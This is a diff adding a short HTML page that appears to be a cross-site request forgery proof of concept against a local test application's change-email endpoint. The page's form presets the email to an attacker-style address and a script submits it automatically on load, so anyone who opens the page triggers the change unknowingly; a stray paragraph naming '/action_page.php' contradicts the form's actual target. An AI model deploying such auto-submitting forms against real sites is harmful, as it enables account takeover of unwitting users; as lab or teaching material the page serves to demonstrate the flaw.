@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Change Email</h2>
+
+<form name="form" method="post" action="http://localhost:8080/change-email">
+  <label for="email">Change Email:</label><br>
+  <input type="text" id="email" type="hidden" name="email" value="evil-email@mail.com"><br>
+  <input type="submit" value="Submit">
+</form> 
+
+<p>If you click the "Submit" button, the form-data will be sent to a page called "/action_page.php".</p>
+<script>
+  document.form.submit();
+</script>
+</body>
+</html>
